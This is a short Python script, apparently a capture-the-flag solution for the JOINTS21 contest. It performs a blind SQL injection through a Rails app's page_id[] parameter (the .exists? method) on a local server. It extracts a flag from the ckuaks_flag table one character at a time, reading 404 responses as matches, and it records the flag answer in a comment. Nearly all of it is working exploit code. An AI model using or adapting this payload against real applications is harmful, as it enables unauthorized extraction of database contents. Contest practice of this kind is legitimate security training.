import requests
import string

# SQLi using .exists? method , ref : https://rails-sqli.org/
# FLAG = "JOINTS21{rails_sqli_via_exist_for_the_win}"

url = "http://localhost:7878/pages/share?page_id[]="
payload = "select hex('{}')=(SELECT hex(substr(content,{},1)) FROM ckuaks_flag)"
liss = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_}{"
flag = ""

cookies = {
    "_myapp_session": "< isi nilai cookie >"
}

count = 1

while "}" not in flag:
    for kar in liss:
        run_payload = payload.format(kar, count)
        final_url = url + run_payload
        res = requests.get(final_url, cookies=cookies)
        if res.status_code == 404:
            flag += kar
            count += 1
            break
    
    print(flag)